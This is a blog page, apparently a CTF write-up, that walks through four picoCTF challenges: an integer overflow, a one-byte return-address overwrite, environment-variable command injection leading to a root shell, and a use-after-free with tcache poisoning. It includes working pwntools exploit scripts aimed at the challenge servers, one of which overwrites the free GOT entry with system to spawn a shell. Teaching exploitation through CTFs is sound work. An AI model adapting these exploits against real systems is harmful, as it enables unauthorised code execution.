@@ -1,0 +1,140 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Note | Welcome to Nerdweb. Let's hax, learn &amp; share pews! </title> <meta name="author" content="Chuks C. Clinton"> <meta name="description" content="A Note writeup"> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: https:; font-src 'self' data: https:; media-src 'self' https:; frame-src 'self' https:; connect-src 'self' https:;"> <link rel="stylesheet" href="/nerdweb007/assets/css/bootstrap.min.css?v=a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/nerdweb007/assets/css/academicons.min.css?v=f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/nerdweb007/assets/css/scholar-icons.css?v=62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/nerdweb007/assets/css/jekyll-pygments-themes-github.css?v=591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/nerdweb007/assets/img/prof_pic.jpg?v=829b82bbf59a4f636d8319640d183b0d"> <link rel="stylesheet" href="/nerdweb007/assets/css/main.css?v=d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://jeffer739.github.io/nerdweb007/blog/2026/note/"> <script src="/nerdweb007/assets/js/theme.js?v=5fea5159b787642c1bbc1f334d60f883"></script> <link defer rel="stylesheet" href="/nerdweb007/assets/css/jekyll-pygments-themes-native.css?v=5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/nerdweb007/"> Welcome to Nerdweb. Let's hax, learn &amp; share pews! </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/nerdweb007/">about </a> </li> <li class="nav-item active"> <a class="nav-link" href="/nerdweb007/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/nerdweb007/projects/">projects </a> </li> <li class="nav-item "> <a class="nav-link" href="/nerdweb007/cv/">CV </a> </li> <li class="nav-item"> <button id="search-toggle" title="Search" onclick="openSearchModal()"> <span class="nav-link">ctrl k <i class="fa-solid fa-magnifying-glass"></i></span> </button> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-half-sun-moon" id="light-toggle-system"></i> <i class="fa-solid fa-moon" id="light-toggle-dark"></i> <i class="fa-solid fa-sun" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Note</h1> <p class="post-meta"> Created on June 07, 2026 </p> <p class="post-tags"> <a href="/nerdweb007/blog/2026"> <i class="fa-solid fa-calendar fa-sm"></i> 2026 </a>   ·   <a href="/nerdweb007/blog/tag/ctf"> <i class="fa-solid fa-hashtag fa-sm"></i> ctf</a>   <a href="/nerdweb007/blog/tag/web"> <i class="fa-solid fa-hashtag fa-sm"></i> web</a>   <a href="/nerdweb007/blog/tag/binary"> <i class="fa-solid fa-hashtag fa-sm"></i> binary</a>   ·   <a href="/nerdweb007/blog/category/writeups"> <i class="fa-solid fa-tag fa-sm"></i> writeups</a> </p> </header> <article class="post-content"> <div id="markdown-content"> <h3> TwoSum </h3> <p><img src="https://user-images.githubusercontent.com/113513376/228693406-b11eb83e-0421-4224-a4fa-a0ea99145dc0.png" alt="image"></p> <p>The source code for the binary is given <img src="https://user-images.githubusercontent.com/113513376/228693499-99eeea03-5a70-4e00-9c52-c4bcc81128ce.png" alt="image"> <img src="https://user-images.githubusercontent.com/113513376/228693651-8c2ad1ac-d6eb-4bff-9591-be1d16c8472c.png" alt="image"></p> <p>Here’s what this code does</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>This C program prompts the user to enter two positive integers, adds them together, and checks for integer overflow. 
+If an integer overflow is detected, the program prints a message and exits.
+If no overflow is detected, the program prints a message and exits.
+</code></pre></div></div> <p>The vulnerability thats present here is integer overflow</p> <p>Here’s the resource on it <a href="https://www.acunetix.com/blog/web-security-zone/what-is-integer-overflow/" rel="external nofollow noopener" target="_blank">acunetix</a></p> <p>So if we give it <code class="language-plaintext highlighter-rouge">2147483647</code> and <code class="language-plaintext highlighter-rouge">1</code> it will cause an integer overflow which will then make the program give the flag</p> <p>Trying it remotely works <img src="https://user-images.githubusercontent.com/113513376/228694294-510c4fc8-0f6d-4908-82cd-ca7d5a561a35.png" alt="image"></p> <h3> BabyGame02 </h3> <p><img src="https://user-images.githubusercontent.com/113513376/228694432-30c4f2af-6d09-4f81-8e83-9066b495d5ef.png" alt="image"></p> <p>After downloading the binary the next thing i check was its file type and protections enabled on the binary <img src="https://user-images.githubusercontent.com/113513376/228694551-248f2666-25c0-4f76-9c0f-2d8b92ea9c92.png" alt="image"></p> <p>So we’re working with a x86 binary and the only protections enabled is just No Execute (NX)</p> <p>Using ghidra i’ll decompile the binary <img src="https://user-images.githubusercontent.com/113513376/228695541-5d0cdbd0-3878-44c4-aecb-1301f1162d90.png" alt="image"></p> <p>This is still the same binary as game01 but the only difference here is that after the user wins the game the win function isn’t called</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  do {
+    do {
+      iVar1 = getchar();
+      local_11 = (char)iVar1;
+      move_player(&amp;local_aa8,(int)local_11,local_a9d);
+      print_map(local_a9d,&amp;local_aa8);
+    } while (local_aa8 != 0x1d);
+  } while (local_aa4 != 0x59);
+  puts("You win!");
+  return 0;
+}
+</code></pre></div></div> <p>After i took my time checking out what happens when the program runs and whats happening in the memory i found that at the calling of solve round+47 the value of the stack register esp will be the return address (address $eip is pointing to) <img src="https://user-images.githubusercontent.com/113513376/228696383-6e3238b3-6d9e-48b7-abe9-e28b74047a40.png" alt="image"> <img src="https://user-images.githubusercontent.com/113513376/228696412-73496aae-9fd7-4446-88b3-2c66b141d7f7.png" alt="image"> <img src="https://user-images.githubusercontent.com/113513376/228696435-9f038fd3-bac5-4dba-be46-d02e56ea0bcf.png" alt="image"></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$eip   : 0x080495b6  →  &lt;solve_round+47&gt; add esp, 0x10
+</code></pre></div></div> <p>It’s means that the eip is pointing to the solve_round function.</p> <p>Now here’s what happen when the player moves around the game and we check the stack memory addresses</p> <p>I’ll set a breakpoint at address move_player+212 <img src="https://user-images.githubusercontent.com/113513376/228696928-d5e4c1d0-fe58-4502-9690-9b4d06d80088.png" alt="image"> <img src="https://user-images.githubusercontent.com/113513376/228696960-e4e7f116-d175-4e6b-a6f5-099f1ba7af46.png" alt="image"> <img src="https://user-images.githubusercontent.com/113513376/228696979-473c7a76-b85a-4a34-bce6-cfc291b0501c.png" alt="image"> <img src="https://user-images.githubusercontent.com/113513376/228697017-09fbc553-0285-473c-8b1a-dd4431ed5b2f.png" alt="image"> <img src="https://user-images.githubusercontent.com/113513376/228697034-33866a6a-b36a-4efd-85dc-597532b5b2b2.png" alt="image"></p> <p>So the player character @ is moving around the stack as we move around the game map</p> <p>If we go out of bound in the game the program will crash because the $eip will try accessing an invalid address</p> <p>Another thing we should take note of is that when we move round the memory it’s pointers on the stack is being modified</p> <p>And since the eip is going to be pointing to solve_round whenever we use <code class="language-plaintext highlighter-rouge">p</code>, and also the solve_round uses the move_player function</p> <p>So the eip will point to the esp</p> <p>The idea now is that can we modify something useful to control the $eip so that we can get it to give us the flag</p> <p>There’s a function given by the game we can allow us change character</p> <p>So since the player character is moving round the stack, so its overwriting some values on the stack</p> <p>But the problem is we can just overwrite the @ structure which only just overwrites the last value of an address of the stack</p> <p>Now this is more of like a ret2win binary exploitation lets find a way to take control of the execution of the program</p> <p>Since we can only overwrite the last byte so we need a similar address to the win() function we can overwrite</p> <p>So after setting a breakpoint at *solve_round+47 <img src="https://user-images.githubusercontent.com/113513376/228698849-80e26381-ea46-452d-b49e-d0f25e42f146.png" alt="image"> <img src="https://user-images.githubusercontent.com/113513376/228698863-e78d3c2e-b6ad-45e0-95d6-3b991645da87.png" alt="image"> <img src="https://user-images.githubusercontent.com/113513376/228698913-31d919dd-ded9-44e4-8883-1ee36424ea21.png" alt="image"></p> <p>Then on checking the stack, i got an address of the stack that looks very similar to the win() function <img src="https://user-images.githubusercontent.com/113513376/228244859-0de6a39f-1b8f-4983-93fc-a4c36823ef00.png" alt="image"></p> <p>We can see the similarity between the stack address 0x08049709 and the win function address 0x0804975d</p> <p>Only one byte difference that makes it not the same as the win function address</p> <p>Now next thing is that since while we move round the map and out of bound, the player character is also moving round the stack therefore overwriting bytes on the stack which makes the program crashes, the idea i think is that there’s a particular memory on the stack can be overwritten to the win function address.</p> <p>And for this to occur the character needed to overwrite it is ] which will later turn to 5d in hex</p> <p>And we know that the l function changes the player character to anything specified. So that means we can change our player character to ]</p> <p>So basically we can control where this ] ends up as this 0x5d which is now the player so we can try and find the position on the map that is 89 bytes offset from that address that is close to the win function which is the stack address we got earlier</p> <p>Using a script i made to move round the map and get the offset</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python3
+
+from pwn import *
+
+context.log_level = 'warning'
+
+for offset in range(40, 50):
+    game = process('./game')
+
+    game.sendline(b'l]')
+    game.sendline(b'w'*4)
+    game.sendline(b'd'*offset)
+    game.sendline(b'wp')
+
+    output = game.recvall()
+    if b'testing' in output:
+        print(f" offset: {offset}")
+        break
+
+    game.close()
+</code></pre></div></div> <p>I already have file flag.txt whose content is <code class="language-plaintext highlighter-rouge">testing{fake_flag}</code></p> <p>Running the script gives the offset to get to the win function <img src="https://user-images.githubusercontent.com/113513376/228699966-296419b0-8d84-4ad4-82a9-d3ae7dfdba94.png" alt="image"></p> <p>Now i can get the flag by running</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 -c "print 'l]' + 'wwww' + 'd'*47 + 'wp'"  | ./game
+</code></pre></div></div> <p>Trying that gets me the flag <img src="https://user-images.githubusercontent.com/113513376/228700159-429ed09f-5165-4484-ac18-3d09d9e152db.png" alt="image"></p> <p>But using remotely doesn’t work <img src="https://user-images.githubusercontent.com/113513376/228700247-7b4307c0-f73b-4e66-ae88-e23d0989d4ff.png" alt="image"></p> <p>After asking in discord people says the binary on the remote is different from the one given (at least its offset)</p> <p>That made me then make a brute force script on the offset</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python3
+
+from pwn import *
+import string
+
+context.log_level = 'warning'
+
+for i in string.printable:
+    io = remote('saturn.picoctf.net', 54253)
+
+    io.sendline('l' + i)
+    io.sendline(b'w' * 4)
+    io.sendline(b'd' * 47)
+    io.sendline(b'wp')
+
+    output = io.recvall()
+    if b'picoCTF' in output:
+        print(f"offset found {i}")
+        offset = i 
+        break
+
+io = remote('saturn.picoctf.net', 54253)
+io.sendline('l' + offset)
+io.sendline(b'w' * 4)
+io.sendline(b'd' * 47)
+io.sendline(b'wp')
+io.interactive()
+</code></pre></div></div> <p>Running it gives the flag <img src="https://user-images.githubusercontent.com/113513376/228701598-d6d8e82c-1010-4f54-b9cf-3a142cda80e5.png" alt="image"> <img src="https://user-images.githubusercontent.com/113513376/228701627-29196b3c-db1b-4dc1-ba23-67afc2de4748.png" alt="image"></p> <h3> VNE </h3> <p><img src="https://user-images.githubusercontent.com/113513376/228703179-7349a3e6-6c9a-48e8-b2a5-c6ec27cec495.png" alt="image"></p> <p>After connecting to the ssh instance it shows this binary file <img src="https://user-images.githubusercontent.com/113513376/228703286-be5662c0-756e-41eb-87d0-1cf59f7eb357.png" alt="image"></p> <p>Running it asks to set the SECRET_DIR environment variable <img src="https://user-images.githubusercontent.com/113513376/228703354-8e7bfe63-8cef-470f-9380-ba86a0ab0a4c.png" alt="image"></p> <p>So i set it to /root <img src="https://user-images.githubusercontent.com/113513376/228703452-85bb23a2-602f-4fa4-b551-5b33cf62968c.png" alt="image"></p> <p>And after running it, it shows the list of files in root directory</p> <p>So its likely doing ls then getenv(SECRET_DIR)</p> <p>I searched for command injection in environment variable and got <a href="https://int0x33.medium.com/day-29-set-user-id-environment-variable-injection-path-user-for-linux-priv-esc-ea6c0adc19b8" rel="external nofollow noopener" target="_blank">Resource</a></p> <p>Trying it works and we get shell as root <img src="https://user-images.githubusercontent.com/113513376/228703774-247af47a-48e4-43ed-b87c-9aeeff9330a3.png" alt="image"></p> <h3> HorseTrack </h3> <p><img src="https://user-images.githubusercontent.com/113513376/228821375-eda5f850-5ea6-4a90-86dd-426bc072e4f4.png" alt="image"></p> <p>After downloading the binary i ran it to get an idea of what it does <img src="https://user-images.githubusercontent.com/113513376/228821545-9ecdfebc-fdee-44b3-be04-ae9ee50aa3ed.png" alt="image"></p> <p>From the challenge description we can tell its a heap sort of challenge and its likely UAF since i noticed most pwn heap chall pico ctf brings are based on UAF</p> <p>After playing with the binary and understanding it, I concluded that for us to exploit this binary we’re going to advantage of tcache poisoning with a UAF vulnerability</p> <p>Here’s my exploit mechanism</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. add_horse() .. allocates buffer
+2. remove_horse() .. frees buffer
+3. move_horse() ...
+4. And finally tcache poisoning attack to have malloc() return an arbritary pointer to a target memory location. Overwritting the free GOT entry with system with a horse named /bin/sh
+</code></pre></div></div> <p>Here’s my solve script</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python3
+
+from pwn import *
+
+LOCAL = True  # Set to False to connect to the remote server
+
+if LOCAL:
+    r = process('./vuln')
+else:
+    r = remote('saturn.picoctf.net', 63578)
+
+def edit_horse(idx, data, spot):
+    r.sendlineafter(b'Choice: ', b'0')
+    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
+    r.sendlineafter(b'Enter a string of 16 characters: ', data)
+    r.sendlineafter(b'New spot? ', str(spot).encode())
+
+def add_horse(idx, size, data):
+    r.sendlineafter(b'Choice: ', b'1')
+    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
+    r.sendlineafter(b'Horse name length (16-256)? ', str(size).encode())
+    r.sendlineafter(b'characters: ', data)
+
+def free_horse(idx):
+    r.sendlineafter(b'Choice: ', b'2')
+    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
+
+def race_horse():
+    r.sendlineafter(b'Choice: ', b'3')
+
+def exploit():
+    # leak heap
+    add_horse(0, 0x10, b'A' * 0x10)
+    free_horse(0)
+    add_horse(0, 0x10, b'\xFF')
+    # fill system GOT
+    for i in range(1, 5):
+        add_horse(i, 0x10, b'X' * 0x10)
+    race_horse()
+    r.recvuntil(b' ')
+    heap_base = u32(r.recvn(10).strip().ljust(4, b'\x00')) &lt;&lt; 12
+    log.info('heap_base: %#x', heap_base)
+    r.recvuntil(b'WINNER:')
+    # tcache list
+    add_horse(10, 0x18, b'A' * 0x18)
+    add_horse(11, 0x18, b'B' * 0x18)
+    free_horse(10)
+    free_horse(11)
+    # change tcache bins to free GOT
+    free_got = 0x404010
+    edit_horse(11, p64(free_got ^ (heap_base &gt;&gt; 12)) + p64(heap_base + 0x10), 1)
+    add_horse(12, 0x18, b'/bin/sh\0' + b'C' * 0x10)
+    # change free GOT to system
+    ret_gadget = 0x401E48
+    system_plt = 0x401090
+    payload = flat(
+        p64(0),
+        p64(system_plt),
+        p64(ret_gadget),
+    )
+    add_horse(13, 0x18, payload)
+    free_horse(12)
+    r.sendline(b'cat flag.txt')
+    r.interactive()
+
+if __name__ == '__main__':
+    exploit()
+
+</code></pre></div></div> <p>Runnig it locally works <img src="https://user-images.githubusercontent.com/113513376/228827277-498951c6-2e84-44b1-a80d-eb0c60de5bb9.png" alt="image"></p> <p>Running it remotely works also (set LOCAL=False in script) <img src="https://user-images.githubusercontent.com/113513376/228827711-c78dbee4-90d2-4406-a1be-ada6e8c7f1fc.png" alt="image"></p> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="https://blog.google/technology/ai/google-gemini-update-flash-ai-assistant-io-2024/" target="_blank" rel="external nofollow noopener">Google Gemini updates: Flash 1.5, Gemma 2 and Project Astra</a> <svg width="1rem" height="1rem" viewbox="0 0 30 30" xmlns="http://www.w3.org/2000/svg"> <path d="M17 13.5v6H5v-12h6m3-3h6v6m0-6-9 9" class="icon_svg-stroke" stroke="#999" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path> </svg> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="https://medium.com/@al-folio/displaying-external-posts-on-your-al-folio-blog-b60a1d241a0a?source=rss-17feae71c3c4------2" target="_blank" rel="external nofollow noopener">Displaying External Posts on Your al-folio Blog</a> <svg width="1rem" height="1rem" viewbox="0 0 30 30" xmlns="http://www.w3.org/2000/svg"> <path d="M17 13.5v6H5v-12h6m3-3h6v6m0-6-9 9" class="icon_svg-stroke" stroke="#999" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path> </svg> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/nerdweb007/blog/2026/road/">Road</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/nerdweb007/blog/2026/pico_writeup/">Pico Walkthrough</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/nerdweb007/blog/2026/pandora/">Pandora</a> </li> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2026 Chuks C. Clinton. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank" rel="external nofollow noopener">Unsplash</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/nerdweb007/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/nerdweb007/assets/js/masonry.js?v=a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/nerdweb007/assets/js/zoom.js?v=85ddb88934d28b74e78031fd54cf8308"></script> <script src="/nerdweb007/assets/js/no_defer.js?v=2781658a0a2b13ed609542042a859126"></script> <script defer src="/nerdweb007/assets/js/common.js?v=c15de51d4bb57887caa2c21988d97279"></script> <script defer src="/nerdweb007/assets/js/copy_code.js?v=c8a01c11a92744d44b093fc3bda915df" type="text/javascript"></script> <script defer src="/nerdweb007/assets/js/jupyter_new_tab.js?v=d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/nerdweb007/assets/js/mathjax-setup.js?v=a5bb4e6a542c546dd929b24b8b236dfd"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/nerdweb007/assets/js/progress-bar.js?v=2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/nerdweb007/assets/js/vanilla-back-to-top.min.js?v=f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> <script type="module" src="/nerdweb007/assets/js/search/ninja-keys.min.js?v=a3446f084dcaecc5f75aa1757d087dcf"></script> <ninja-keys hidebreadcrumbs noautoloadmdicons placeholder="Type to start searching"></ninja-keys> <script src="/nerdweb007/assets/js/search-setup.js?v=6c304f7b1992d4b60f7a07956e52f04a"></script> <script src="/nerdweb007/assets/js/search-data.js"></script> <script src="/nerdweb007/assets/js/shortcut-key.js?v=ccc841c459bfc0e64c1c2b5acd10df02"></script> </body> </html>
